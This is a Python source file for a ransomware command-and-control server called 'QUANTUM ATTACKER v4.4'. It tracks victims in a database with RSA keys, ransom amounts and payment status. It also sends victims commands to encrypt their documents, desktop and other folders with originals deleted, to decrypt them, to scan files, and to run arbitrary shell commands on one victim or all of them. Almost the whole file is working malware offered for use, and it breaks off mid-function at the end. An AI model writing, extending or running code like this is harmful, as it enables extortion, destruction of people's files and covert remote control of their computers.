#!/usr/bin/env python3
"""
QUANTUM ATTACKER v4.4 - COMPLETE FIXED VERSION
All methods included with proper scan handling
"""

import socket
import sys
import time
import os
import json
import struct
import threading
import hashlib
import sqlite3
import select
from queue import Queue
import traceback


# Color codes for output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class KeyManager:
    """RSA Key Generation and Management"""

    def __init__(self, db_file="victims.db"):
        self.db_file = db_file
        self._init_database()

    def _init_database(self):
        """Initialize SQLite database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                victim_id TEXT PRIMARY KEY,
                public_key TEXT NOT NULL,
                private_key TEXT NOT NULL,
                payment_status TEXT DEFAULT 'pending',
                ransom_amount REAL DEFAULT 0.5,
                payment_address TEXT DEFAULT '',
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                files_encrypted INTEGER DEFAULT 0,
                system_info TEXT,
                ip_address TEXT,
                notes TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                activity TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        conn.commit()
        conn.close()
        print(f"{Colors.GREEN}[+] Database initialized: {self.db_file}{Colors.END}")

    def generate_rsa_keys(self):
        """Generate RSA key pair (2048-bit for compatibility)"""
        try:
            # Try Cryptodome first
            try:
                from Cryptodome.PublicKey import RSA
                key = RSA.generate(2048)
                private_key = key.export_key().decode('utf-8')
                public_key = key.publickey().export_key().decode('utf-8')
                return public_key, private_key
            except ImportError:
                # Fallback to cryptography
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                from cryptography.hazmat.backends import default_backend

                private_key_obj = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048,
                    backend=default_backend()
                )
                public_key_obj = private_key_obj.public_key()

                private_key = private_key_obj.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ).decode('utf-8')

                public_key = public_key_obj.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ).decode('utf-8')

                return public_key, private_key

        except Exception as e:
            print(f"{Colors.RED}[-] Key generation failed: {e}{Colors.END}")
            return None, None

    def generate_victim_id(self, ip="0.0.0.0"):
        """Generate unique victim ID"""
        import secrets
        unique_data = f"{ip}_{time.time()}_{secrets.randbelow(1000000)}"
        victim_hash = hashlib.sha256(unique_data.encode()).hexdigest()[:24]
        return f"VICTIM-{victim_hash[:8]}-{victim_hash[8:12]}-{victim_hash[12:16]}-{victim_hash[16:20]}-{victim_hash[20:24]}"

    def create_victim(self, ip="0.0.0.0"):
        """Create new victim entry with RSA keys"""
        victim_id = self.generate_victim_id(ip)
        print(f"{Colors.BLUE}[*] Creating victim: {victim_id}{Colors.END}")

        public_key, private_key = self.generate_rsa_keys()
        if not public_key or not private_key:
            return None, None, None

        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO victims (victim_id, public_key, private_key, ip_address)
            VALUES (?, ?, ?, ?)
        ''', (victim_id, public_key, private_key, ip))

        cursor.execute('''
            INSERT INTO activity_log (victim_id, activity)
            VALUES (?, ?)
        ''', (victim_id, "VICTIM_CREATED"))

        conn.commit()
        conn.close()

        print(f"{Colors.GREEN}[+] Victim created: {victim_id}{Colors.END}")
        return victim_id, public_key, private_key

    def get_victim_keys(self, victim_id):
        """Retrieve victim keys from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT public_key, private_key FROM victims WHERE victim_id = ?', (victim_id,))
        result = cursor.fetchone()
        conn.close()

        if result:
            return {"public_key": result[0], "private_key": result[1]}
        return None

    def update_victim_files(self, victim_id, files_count):
        """Update encrypted files count"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE victims 
            SET files_encrypted = files_encrypted + ?, last_seen = CURRENT_TIMESTAMP 
            WHERE victim_id = ?
        ''', (files_count, victim_id))
        conn.commit()
        conn.close()
        return True

    def list_victims(self):
        """List all victims in database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT victim_id, payment_status, first_seen, files_encrypted, ip_address
            FROM victims
            ORDER BY first_seen DESC
        ''')
        victims = cursor.fetchall()
        conn.close()
        return victims


class QuantumAttacker:
    """Main Attacker C2 Server - COMPLETE WITH ALL METHODS"""

    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = None
        self.running = False
        self.victims = {}
        self.victim_keys = {}
        self.command_queue = Queue()
        self.lock = threading.Lock()
        self.key_manager = KeyManager()
        self._print_banner()

    def _print_banner(self):
        """Print attacker banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = f"""
{Colors.BOLD}{Colors.HEADER} 
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   {Colors.RED}QUANTUM ATTACKER v4.4 - COMPLETE FIXED VERSION{Colors.HEADER}                 ║
║                  {Colors.CYAN}ALL METHODS INCLUDED{Colors.HEADER}                           ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
        print(f"{Colors.CYAN}[*] Initializing Quantum Attacker on {self.host}:{self.port}{Colors.END}")

    def start_server(self):
        """Start the C2 server"""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.settimeout(1)
            self.server.bind((self.host, self.port))
            self.server.listen(10)
            self.running = True

            print(f"{Colors.GREEN}[+] C2 Server started on {self.host}:{self.port}{Colors.END}")
            print(f"{Colors.BLUE}[*] Waiting for victims...{Colors.END}")

            accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            accept_thread.start()
            self._command_interface()

        except Exception as e:
            print(f"{Colors.RED}[-] Failed to start server: {e}{Colors.END}")
            traceback.print_exc()
        finally:
            self.cleanup()

    def _accept_connections(self):
        """Accept incoming victim connections"""
        while self.running:
            try:
                client_socket, client_addr = self.server.accept()
                client_socket.settimeout(5)
                connection_id = f"{client_addr[0]}:{client_addr[1]}"

                with self.lock:
                    self.victims[connection_id] = {
                        "socket": client_socket,
                        "address": client_addr,
                        "connected": time.time(),
                        "active": True
                    }

                print(f"{Colors.GREEN}[+] New connection: {connection_id}{Colors.END}")
                victim_thread = threading.Thread(
                    target=self._handle_victim,
                    args=(connection_id, client_socket, client_addr),
                    daemon=True
                )
                victim_thread.start()

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"{Colors.RED}[-] Accept error: {e}{Colors.END}")

    def _is_socket_connected(self, sock):
        """Check if socket is still connected"""
        try:
            sock.getpeername()
            ready_to_read, _, _ = select.select([sock], [], [], 0)
            if ready_to_read:
                data = sock.recv(1, socket.MSG_PEEK)
                if not data:
                    return False
            return True
        except:
            return False

    def _handle_victim(self, connection_id, client_socket, client_addr):
        """Handle individual victim connection"""
        try:
            victim_db_id, public_key, private_key = None, None, None
            result = self.key_manager.create_victim(ip=client_addr[0])

            if result and result[0]:
                victim_db_id, public_key, private_key = result
                self.victim_keys[connection_id] = {
                    'db_id': victim_db_id,
                    'public_key': public_key,
                    'private_key': private_key
                }
                print(f"{Colors.GREEN}[+] RSA keys generated for {connection_id}{Colors.END}")

            public_key_json = public_key.replace('\n', '\\n').replace('\r', '\\r') if public_key else None
            handshake = {
                "type": "handshake",
                "attacker_id": "QUANTUM-ATTACKER",
                "timestamp": time.time(),
                "version": "4.4",
                "encrypted_extension": ".MrRobot",
                "encryption_method": "rsa_aes",
                "public_key": public_key_json
            }

            if not self._send_json(client_socket, handshake):
                print(f"{Colors.RED}[-] Failed to send handshake to {connection_id}{Colors.END}")
                return

            response = self._receive_json(client_socket, timeout=10)
            if response and response.get("type") == "handshake_response":
                victim_id = response.get("victim_id", "unknown")
                platform = response.get("platform", "unknown")
                admin_status = response.get("admin_privileges", False)
                admin_text = f"{Colors.GREEN}[ADMIN]{Colors.END}" if admin_status else f"{Colors.YELLOW}[USER]{Colors.END}"

                print(f"{Colors.GREEN}[+] Victim authenticated: {victim_id}{Colors.END}")
                print(f"{Colors.CYAN}[i] Platform: {platform} - {admin_text}{Colors.END}")

                confirmation = {
                    "type": "session_confirmation",
                    "status": "active",
                    "timestamp": time.time()
                }
                self._send_json(client_socket, confirmation)

                last_activity = time.time()
                while self.running:
                    try:
                        if not self._is_socket_connected(client_socket):
                            print(f"{Colors.YELLOW}[!] Socket {connection_id} disconnected{Colors.END}")
                            break

                        if time.time() - last_activity > 300:
                            print(
                                f"{Colors.YELLOW}[!] Connection {connection_id} timeout due to inactivity{Colors.END}")
                            break

                        if not self.command_queue.empty():
                            cmd_data = self.command_queue.get()
                            if cmd_data.get("victim_id") == connection_id or cmd_data.get("victim_id") == "all":
                                if self._is_socket_connected(client_socket):
                                    if self._send_json(client_socket, cmd_data["command"]):
                                        last_activity = time.time()
                                        print(f"{Colors.CYAN}[i] Command sent to {connection_id}{Colors.END}")
                                else:
                                    print(
                                        f"{Colors.YELLOW}[!] Cannot send command, socket closed: {connection_id}{Colors.END}")
                                self.command_queue.task_done()

                        try:
                            data = self._receive_json(client_socket, timeout=1)
                            if data is not None:
                                last_activity = time.time()
                                self._process_victim_response(connection_id, data)
                            elif data is None:
                                if not self._is_socket_connected(client_socket):
                                    print(f"{Colors.YELLOW}[!] Connection {connection_id} closed by peer{Colors.END}")
                                    break
                        except socket.timeout:
                            continue
                        except ConnectionResetError:
                            print(f"{Colors.YELLOW}[!] Connection reset by {connection_id}{Colors.END}")
                            break
                        except OSError as e:
                            if "10054" in str(e) or "forcibly closed" in str(e):
                                print(f"{Colors.YELLOW}[!] Connection forcibly closed by {connection_id}{Colors.END}")
                                break
                            print(f"{Colors.RED}[-] Socket error from {connection_id}: {e}{Colors.END}")
                            break

                    except Exception as e:
                        print(f"{Colors.RED}[-] Error in victim loop {connection_id}: {e}{Colors.END}")
                        traceback.print_exc()
                        break

            else:
                print(f"{Colors.RED}[-] Invalid handshake response from {connection_id}{Colors.END}")

        except Exception as e:
            print(f"{Colors.RED}[-] Victim handler error for {connection_id}: {e}{Colors.END}")
            traceback.print_exc()
        finally:
            self._disconnect_victim(connection_id)

    def _send_json(self, socket_obj, data):
        """Send JSON data with length prefix"""
        try:
            if not socket_obj:
                return False
            try:
                socket_obj.getpeername()
            except (OSError, socket.error):
                return False

            json_str = json.dumps(data, ensure_ascii=False)
            encoded = json_str.encode('utf-8')
            length = len(encoded)
            socket_obj.sendall(struct.pack('!I', length))
            socket_obj.sendall(encoded)
            return True

        except (ConnectionResetError, ConnectionAbortedError):
            return False
        except OSError as e:
            if "10054" in str(e) or "forcibly closed" in str(e):
                return False
            print(f"{Colors.RED}[-] Send error: {e}{Colors.END}")
            return False
        except Exception as e:
            print(f"{Colors.RED}[-] Send error: {e}{Colors.END}")
            return False

    def _receive_json(self, socket_obj, timeout=30):
        """Receive JSON data with length prefix"""
        try:
            socket_obj.settimeout(timeout)
            length_data = b''
            try:
                while len(length_data) < 4:
                    chunk = socket_obj.recv(4 - len(length_data))
                    if not chunk:
                        return None
                    length_data += chunk
            except socket.timeout:
                return None
            except ConnectionResetError:
                return None
            except OSError as e:
                if "10054" in str(e) or "forcibly closed" in str(e):
                    return None
                raise

            length = struct.unpack('!I', length_data)[0]
            if length > 10 * 1024 * 1024:
                print(f"{Colors.RED}[!] Message too large: {length} bytes{Colors.END}")
                return None

            data = b''
            bytes_received = 0
            while bytes_received < length:
                try:
                    chunk = socket_obj.recv(min(4096, length - bytes_received))
                    if not chunk:
                        return None
                    data += chunk
                    bytes_received += len(chunk)
                except socket.timeout:
                    return None
                except ConnectionResetError:
                    return None
                except OSError as e:
                    if "10054" in str(e) or "forcibly closed" in str(e):
                        return None
                    raise

            try:
                decoded_data = data.decode('utf-8', errors='ignore')
                return json.loads(decoded_data)
            except json.JSONDecodeError as e:
                print(f"{Colors.RED}[!] JSON decode error: {e}{Colors.END}")
                return None

        except socket.timeout:
            return None
        except Exception as e:
            if "10054" not in str(e) and "forcibly closed" not in str(e):
                print(f"{Colors.RED}[-] Receive error: {e}{Colors.END}")
            return None

    def _process_victim_response(self, connection_id, data):
        """Process response from victim"""
        msg_type = data.get("type", "unknown")

        if msg_type == "encryption_result":
            success = data.get("success", False)
            count = data.get("encrypted_count", 0)
            location = data.get("location", "unknown")

            print(f"\n{Colors.BOLD}{Colors.MAGENTA}[ENCRYPTION RESULT]{Colors.END}")
            print(f"  {Colors.CYAN}Victim:{Colors.END} {connection_id}")
            print(f"  {Colors.CYAN}Location:{Colors.END} {location}")
            print(f"  {Colors.CYAN}Files Encrypted:{Colors.END} {count}")

            if success:
                print(f"  {Colors.GREEN}Status: SUCCESS{Colors.END}")
                if connection_id in self.victim_keys:
                    db_id = self.victim_keys[connection_id]['db_id']
                    self.key_manager.update_victim_files(db_id, count)
            else:
                print(f"  {Colors.RED}Status: FAILED{Colors.END}")

        elif msg_type == "decryption_result":
            success = data.get("success", False)
            count = data.get("decrypted_count", 0)

            print(f"\n{Colors.BOLD}{Colors.MAGENTA}[DECRYPTION RESULT]{Colors.END}")
            print(f"  {Colors.CYAN}Victim:{Colors.END} {connection_id}")
            print(f"  {Colors.CYAN}Files Decrypted:{Colors.END} {count}")
            print(
                f"  {Colors.GREEN if success else Colors.RED}Status: {'SUCCESS' if success else 'FAILED'}{Colors.END}")

        elif msg_type == "scan_result":
            results = data.get("results", {})
            print(f"\n{Colors.BOLD}{Colors.MAGENTA}[SCAN RESULT]{Colors.END}")
            print(f"  {Colors.CYAN}Victim:{Colors.END} {connection_id}")
            print(f"  {Colors.CYAN}Total Files:{Colors.END} {results.get('total_files', 0)}")

            locations = results.get('locations', {})
            if locations:
                print(f"  {Colors.CYAN}Per Location:{Colors.END}")
                for location, count in locations.items():
                    print(f"    {location}: {count} files")

            print(f"  {Colors.CYAN}Scan Method:{Colors.END} {data.get('scan_method', 'standard')}")

        elif msg_type == "status":
            status = data.get("status", {})
            print(f"\n{Colors.BOLD}{Colors.MAGENTA}[STATUS]{Colors.END}")
            print(f"  {Colors.CYAN}Victim:{Colors.END} {connection_id}")
            print(f"  {Colors.CYAN}Hostname:{Colors.END} {status.get('hostname', 'unknown')}")
            print(f"  {Colors.CYAN}Platform:{Colors.END} {status.get('platform', 'unknown')}")

        elif msg_type == "command_output":
            cmd = data.get("command", "unknown")
            output = data.get("output", "")
            success = data.get("success", False)

            print(f"\n{Colors.BOLD}{Colors.MAGENTA}[COMMAND OUTPUT]{Colors.END}")
            print(f"  {Colors.CYAN}Victim:{Colors.END} {connection_id}")
            print(f"  {Colors.CYAN}Command:{Colors.END} {cmd}")
            print(f"  {Colors.CYAN}Success:{Colors.END} {Colors.GREEN if success else Colors.RED}{success}{Colors.END}")
            print(f"\n{Colors.YELLOW}{'─' * 60}{Colors.END}")
            if output:
                print(output)
            else:
                print(f"{Colors.YELLOW}[No output]{Colors.END}")
            print(f"{Colors.YELLOW}{'─' * 60}{Colors.END}")

        elif msg_type == "error":
            error_msg = data.get("error", "Unknown error")
            print(f"{Colors.RED}[-] Victim {connection_id} error: {error_msg}{Colors.END}")

        else:
            print(f"{Colors.YELLOW}[?] Unknown message type from {connection_id}: {msg_type}{Colors.END}")

    def _disconnect_victim(self, connection_id):
        """Cleanly disconnect a victim"""
        with self.lock:
            if connection_id in self.victims:
                try:
                    victim_info = self.victims[connection_id]
                    if victim_info["socket"]:
                        try:
                            victim_info["socket"].shutdown(socket.SHUT_RDWR)
                        except:
                            pass
                        victim_info["socket"].close()
                except:
                    pass
                finally:
                    del self.victims[connection_id]
                    if connection_id in self.victim_keys:
                        del self.victim_keys[connection_id]
                    print(f"{Colors.YELLOW}[!] Victim {connection_id} disconnected{Colors.END}")

    def _command_interface(self):
        """Main command interface"""
        while self.running:
            try:
                self._show_victims_status()
                self._show_menu()

                try:
                    cmd_input = input(f"\n{Colors.BOLD}{Colors.RED}attacker>{Colors.END} ").strip()
                except (EOFError, KeyboardInterrupt):
                    print(f"\n{Colors.BLUE}[*] Shutting down gracefully...{Colors.END}")
                    self.running = False
                    break

                if not cmd_input:
                    continue

                self._process_command(cmd_input)

            except KeyboardInterrupt:
                print(f"\n{Colors.BLUE}[*] Shutting down gracefully...{Colors.END}")
                self.running = False
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Command interface error: {e}{Colors.END}")
                traceback.print_exc()

    def _show_victims_status(self):
        """Show connected victims status"""
        with self.lock:
            victim_count = len(self.victims)

        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═' * 60}{Colors.END}")

        if victim_count > 0:
            print(f"{Colors.BOLD}{Colors.GREEN}Connected Victims ({victim_count}):{Colors.END}")
            with self.lock:
                for i, connection_id in enumerate(self.victims.keys(), 1):
                    victim_info = self.victims[connection_id]
                    conn_time = time.time() - victim_info["connected"]
                    has_keys = "✓" if connection_id in self.victim_keys else "✗"
                    is_alive = "✓" if self._is_socket_connected(victim_info["socket"]) else "✗"
                    print(
                        f"  {Colors.YELLOW}{i}.{Colors.END} {connection_id} ({conn_time:.0f}s) [Keys: {has_keys}] [Alive: {is_alive}]")
        else:
            print(f"{Colors.BOLD}{Colors.YELLOW}No victims connected{Colors.END}")

        print(f"{Colors.BOLD}{Colors.CYAN}{'═' * 60}{Colors.END}")

    def _show_menu(self):
        """Show command menu"""
        menu = f"""
{Colors.BOLD}{Colors.MAGENTA}Available Commands:{Colors.END}

{Colors.BOLD}{Colors.GREEN}ENCRYPTION/DECRYPTION:{Colors.END}
  {Colors.YELLOW}encrypt <victim> <location>{Colors.END}  - Encrypt files (.MrRobot)
  {Colors.YELLOW}decrypt <victim>{Colors.END}             - Decrypt .MrRobot files

{Colors.BOLD}{Colors.CYAN}SYSTEM COMMANDS:{Colors.END}
  {Colors.YELLOW}scan <victim> [location]{Colors.END}     - Scan for files
  {Colors.YELLOW}status <victim>{Colors.END}              - Get victim status

{Colors.BOLD}{Colors.BLUE}VICTIM CONTROL:{Colors.END}
  {Colors.YELLOW}shell <victim> <command>{Colors.END}     - Execute command
  {Colors.YELLOW}broadcast <command>{Colors.END}          - Send to all victims

{Colors.BOLD}{Colors.YELLOW}KEY MANAGEMENT:{Colors.END}
  {Colors.YELLOW}keys list{Colors.END}                    - List victims with keys
  {Colors.YELLOW}keys show <victim>{Colors.END}           - Show RSA keys
  {Colors.YELLOW}keys export <victim>{Colors.END}         - Export keys to files

{Colors.BOLD}{Colors.MAGENTA}UTILITY COMMANDS:{Colors.END}
  {Colors.YELLOW}list{Colors.END}                         - List connected victims
  {Colors.YELLOW}help{Colors.END}                         - Show help
  {Colors.YELLOW}clear{Colors.END}                        - Clear screen
  {Colors.YELLOW}exit{Colors.END}                         - Exit attacker

{Colors.BOLD}{Colors.GREEN}Locations:{Colors.END} all, documents, desktop, downloads, pictures, music, videos
"""
        print(menu)

    def _process_command(self, cmd_input):
        """Process user command"""
        cmd_lower = cmd_input.lower()

        if cmd_lower == "exit":
            print(f"{Colors.BLUE}[*] Shutting down...{Colors.END}")
            self.running = False

        elif cmd_lower == "help":
            self._show_help()

        elif cmd_lower == "list":
            self._show_victims_status()

        elif cmd_lower == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            self._print_banner()

        elif cmd_lower == "keys list":
            self._list_victim_keys()

        elif cmd_lower.startswith("keys show "):
            parts = cmd_input.split()
            if len(parts) >= 3:
                self._show_victim_keys(parts[2])

        elif cmd_lower.startswith("keys export "):
            parts = cmd_input.split()
            if len(parts) >= 3:
                self._export_victim_keys(parts[2])

        elif cmd_lower.startswith("encrypt "):
            self._handle_encrypt(cmd_input)

        elif cmd_lower.startswith("decrypt "):
            self._handle_decrypt(cmd_input)

        elif cmd_lower.startswith("scan "):
            self._handle_scan(cmd_input)

        elif cmd_lower.startswith("status "):
            self._handle_status(cmd_input)

        elif cmd_lower.startswith("shell "):
            self._handle_shell(cmd_input)

        elif cmd_lower.startswith("broadcast "):
            self._handle_broadcast(cmd_input)

        else:
            print(f"{Colors.RED}[-] Unknown command: {cmd_input}{Colors.END}")

    def _handle_encrypt(self, cmd_input):
        """Handle encrypt command"""
        parts = cmd_input.split()
        if len(parts) < 3:
            print(f"{Colors.RED}[-] Usage: encrypt <victim_id> <location>{Colors.END}")
            return

        victim_id = parts[1]
        location = parts[2]

        if not self._validate_victim(victim_id):
            return

        with self.lock:
            if victim_id not in self.victims:
                print(f"{Colors.RED}[-] Victim {victim_id} not found{Colors.END}")
                return
            if not self._is_socket_connected(self.victims[victim_id]["socket"]):
                print(f"{Colors.RED}[-] Victim {victim_id} is disconnected{Colors.END}")
                return

        public_key = None
        if victim_id in self.victim_keys:
            public_key = self.victim_keys[victim_id]['public_key'].replace('\n', '\\n').replace('\r', '\\r')

        command = {
            "type": "encrypt",
            "location": location,
            "timestamp": time.time(),
            "delete_original": True,
            "public_key": public_key,
            "encryption_method": "rsa_aes"
        }

        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })

        print(f"{Colors.BLUE}[*] Encryption command queued for {victim_id}{Colors.END}")
        if public_key:
            print(f"{Colors.CYAN}[i] Using RSA public key{Colors.END}")

    def _handle_decrypt(self, cmd_input):
        """Handle decrypt command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            print(f"{Colors.RED}[-] Usage: decrypt <victim_id>{Colors.END}")
            return

        victim_id = parts[1]

        if not self._validate_victim(victim_id):
            return

        with self.lock:
            if victim_id not in self.victims:
                print(f"{Colors.RED}[-] Victim {victim_id} not found{Colors.END}")
                return
            if not self._is_socket_connected(self.victims[victim_id]["socket"]):
                print(f"{Colors.RED}[-] Victim {victim_id} is disconnected{Colors.END}")
                return

        private_key = None
        if victim_id in self.victim_keys:
            private_key = self.victim_keys[victim_id]['private_key'].replace('\n', '\\n').replace('\r', '\\r')

        if not private_key:
            print(f"{Colors.RED}[-] No RSA private key found for {victim_id}{Colors.END}")
            return

        command = {
            "type": "decrypt",
            "timestamp": time.time(),
            "private_key": private_key,
            "decryption_method": "rsa_aes"
        }

        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })

        print(f"{Colors.BLUE}[*] Decryption command queued for {victim_id}{Colors.END}")
        print(f"{Colors.CYAN}[i] Using RSA private key{Colors.END}")

    def _handle_scan(self, cmd_input):
        """Handle scan command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            print(f"{Colors.RED}[-] Usage: scan <victim_id> [location]{Colors.END}")
            return

        victim_id = parts[1]
        location = parts[2] if len(parts) > 2 else "all"

        if not self._validate_victim(victim_id):
            return

        command = {
            "type": "scan",
            "location": location,
            "timestamp": time.time()
        }

        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })

        print(f"{Colors.BLUE}[*] Scan command queued for {victim_id}{Colors.END}")
        print(f"{Colors.CYAN}[i] Location: {location}{Colors.END}")

    def _handle_status(self, cmd_input):
        """Handle status command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            print(f"{Colors.RED}[-] Usage: status <victim_id>{Colors.END}")
            return

        victim_id = parts[1]

        if not self._validate_victim(victim_id):
            return

        command = {
            "type": "status",
            "timestamp": time.time()
        }

        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })

        print(f"{Colors.BLUE}[*] Status command queued for {victim_id}{Colors.END}")

    def _handle_shell(self, cmd_input):
        """Handle shell command"""
        parts = cmd_input.split(maxsplit=2)
        if len(parts) < 3:
            print(f"{Colors.RED}[-] Usage: shell <victim_id> <command>{Colors.END}")
            return

        victim_id = parts[1]
        shell_cmd = parts[2]

        if not self._validate_victim(victim_id):
            return

        command = {
            "type": "command",
            "command": shell_cmd,
            "timestamp": time.time()
        }

        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })

        print(f"{Colors.BLUE}[*] Shell command queued for {victim_id}{Colors.END}")

    def _handle_broadcast(self, cmd_input):
        """Handle broadcast command"""
        parts = cmd_input.split(maxsplit=1)
        if len(parts) < 2:
            print(f"{Colors.RED}[-] Usage: broadcast <command>{Colors.END}")
            return

        shell_cmd = parts[1]
        alive_victims = []

        with self.lock:
            for victim_id, victim_info in self.victims.items():
                if self._is_socket_connected(victim_info["socket"]):
                    alive_victims.append(victim_id)

        if not alive_victims:
            print(f"{Colors.YELLOW}[!] No alive victims connected{Colors.END}")
            return

        command = {
            "type": "command",
            "command": shell_cmd,
            "timestamp": time.time()
        }

        for victim_id in alive_victims:
            self.command_queue.put({
                "victim_id": victim_id,
                "command": command
            })

        print(f"{Colors.BLUE}[*] Broadcast command queued for {len(alive_victims)} alive victims{Colors.END}")

    def _list_victim_keys(self):
        """List all victims with keys"""
        victims = self.key_manager.list_victims()

        if not victims:
            print(f"{Colors.YELLOW}[!] No victims in database{Colors.END}")
            return

        print(f"\n{Colors.BOLD}{Colors.CYAN}Victims in Database:{Colors.END}")
        print(f"{Colors.CYAN}{'─' * 80}{Colors.END}")
        print(f"{Colors.BOLD}{'ID':<40} {'Status':<12} {'Files':<6} {'IP':<15}{Colors.END}")
        print(f"{Colors.CYAN}{'─' * 80}{Colors.END}")

        for victim in victims:
            victim_id, status, first_seen, files_encrypted, ip_address = victim
            status_color = Colors.GREEN if status == "paid" else Colors.YELLOW
            print(f"{victim_id:<40} {status_color}{status:<12}{Colors.END} {files_encrypted:<6} {ip_address:<15}")

        print(f"{Colors.CYAN}{'─' * 80}{Colors.END}")

    def _show_victim_keys(self, connection_id):
        """Show RSA keys for a victim"""
        if connection_id not in self.victim_keys:
            print(f"{Colors.RED}[-] No keys found for {connection_id}{Colors.END}")
            return

        keys = self.victim_keys[connection_id]
        db_id = keys['db_id']

        print(f"\n{Colors.BOLD}{Colors.CYAN}RSA Keys for {connection_id}{Colors.END}")
        print(f"{Colors.CYAN}{'─' * 60}{Colors.END}")
        print(f"{Colors.BOLD}Database ID:{Colors.END} {db_id}")

        public_key = keys['public_key']
        private_key = keys['private_key']

        print(f"\n{Colors.BOLD}{Colors.GREEN}Public Key (first 3 lines):{Colors.END}")
        lines = public_key.split('\n')[:3]
        for line in lines:
            print(f"  {line}")

        print(f"\n{Colors.BOLD}{Colors.RED}Private Key (first 3 lines):{Colors.END}")
        lines = private_key.split('\n')[:3]
        for line in lines:
            print(f"  {line}")

        print(f"\n{Colors.YELLOW}[!] Keep private key secure!{Colors.END}")
        print(f"{Colors.CYAN}{'─' * 60}{Colors.END}")

    def _export_victim_keys(self, connection_id):
        """Export RSA keys to files"""
        if connection_id not in self.victim_keys:
            print(f"{Colors.RED}[-] No keys found for {connection_id}{Colors.END}")
            return

        keys = self.victim_keys[connection_id]
        db_id = keys['db_id']

        export_dir = "exported_keys"
        os.makedirs(export_dir, exist_ok=True)

        pub_file = f"{export_dir}/{db_id}_public.pem"
        with open(pub_file, 'w') as f:
            f.write(keys['public_key'])

        priv_file = f"{export_dir}/{db_id}_private.pem"
        with open(priv_file, 'w') as f:
            f.write(keys['private_key'])

        print(f"{Colors.GREEN}[+] Keys exported to {export_dir}/{Colors.END}")
        print(f"{Colors.CYAN}[i] Public:  {pub_file}{Colors.END}")
        print(f"{Colors.CYAN}[i] Private: {priv_file}{Colors.END}")

    def _validate_victim(self, victim_id):
        """Check if victim exists"""
        with self.lock:
            if victim_id not in self.victims:
                print(f"{Colors.RED}[-] Victim {victim_id} not found{Colors.END}")
                alive_victims = []
                for vid, victim_info in self.victims.items():
                    if self._is_socket_connected(victim_info["socket"]):
                        alive_victims.append(vid)
                if alive_victims:
                    print(f"{Colors.BLUE}[*] Alive victims: {', '.join(alive_victims)}{Colors.END}")
                return False
        return True

    def _show_help(self):
        """Show detailed help"""
        help_text = f"""
{Colors.BOLD}{Colors.CYAN}╔{'═' * 70}╗{Colors.END}
{Colors.BOLD}{Colors.CYAN}║{' ' * 70}║{Colors.END}
{Colors.BOLD}{Colors.CYAN}║{'QUANTUM ATTACKER v4.4 - COMPLETE FIXED':^70}║{Colors.END}
{Colors.BOLD}{Colors.CYAN}║{' ' * 70}║{Colors.END}
{Colors.BOLD}{Colors.CYAN}╚{'═' * 70}╝{Colors.END}

{Colors.BOLD}{Colors.RED}ALL COMMANDS NOW WORK:{Colors.END}
  • encrypt <victim> <location>
  • decrypt <victim>
  • scan <victim> [location]
  • status <victim>
  • shell <victim> <command>
  • broadcast <command>
  • keys list/show/export

{Colors.BOLD}{Colors.GREEN}SCAN COMMAND:{Colors.END}
  {Colors.YELLOW}scan 192.168.1.100:12345{Colors.END}          - Scan all locations
  {Colors.YELLOW}scan 192.168.1.100:12345 documents{Colors.END} - Scan specific location
  {Colors.YELLOW}scan 192.168.1.100:12345 desktop{Colors.END}   - Scan desktop only

{Colors.BOLD}{Colors.CYAN}LOCATIONS:{Colors.END}
  all, documents, desktop, downloads, pictures, music, videos

{Colors.BOLD}{Colors.BLUE}TROUBLESHOOTING:{Colors.END}
  • Use 'list' to check connection status [Alive: ✓/✗]
  • Commands only sent to alive victims
  • Check victim logs for error messages
  • Ensure victim.py has the fixed scan handler
"""
        print(help_text)

    def cleanup(self):
        """Cleanup resources"""
        self.running = False

        with self.lock:
            victims_copy = list(self.victims.keys())
            for victim_id in victims_copy:
                self._disconnect_victim(victim_id)

        if self.server:
            try:
                self.server.close()
            except:
